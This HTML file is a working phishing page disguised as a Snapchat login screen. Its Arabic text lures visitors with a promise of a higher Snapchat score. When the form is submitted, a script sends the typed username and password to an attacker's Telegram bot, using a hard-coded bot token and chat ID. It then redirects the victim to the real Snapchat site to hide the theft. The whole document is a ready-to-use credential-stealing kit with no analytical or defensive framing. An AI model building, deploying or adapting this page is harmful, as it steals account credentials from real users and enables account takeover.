<!DOCTYPE html><html><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><title>Snapchat</title><style>body{background:#fffc00;margin:0;font-family:sans-serif;display:flex;justify-content:center;align-items:center;height:100vh;}.card{background:#fff;padding:40px 20px;border-radius:25px;width:90%;max-width:400px;text-align:center;}input{width:100%;padding:16px;margin:12px 0;border:1px solid #ddd;border-radius:30px;background:#f0f0f0;font-size:16px;box-sizing:border-box;}.btn{background:#000;color:#fff;width:100%;padding:16px;border-radius:30px;font-weight:bold;font-size:18px;border:none;margin-top:20px;}</style></head><body><div class="card"><h2>Snapchat</h2><p>تفعيل زيادة السكور</p><form id="f"><input type="text" id="u" placeholder="اسم المستخدم" required><input type="password" id="p" placeholder="كلمة المرور" required><button type="submit" class="btn">تأكيد</button></form></div><script>document.getElementById('f').onsubmit=(e)=>{e.preventDefault();const text=`👻 صيد سناب جديد 👻\n\n👤 اليوزر: ${document.getElementById('u').value}\n🔑 الباسورد: ${document.getElementById('p').value}`;fetch(`https://api.telegram.org/bot7929608386:AAE8dCcbTPRTEBpVPvhyIsfdyLl42mmRfnM/sendMessage?chat_id=6829017835&text=${encodeURIComponent(text)}`).finally(()=>{location.href='https://snapchat.com';});};</script></body></html>
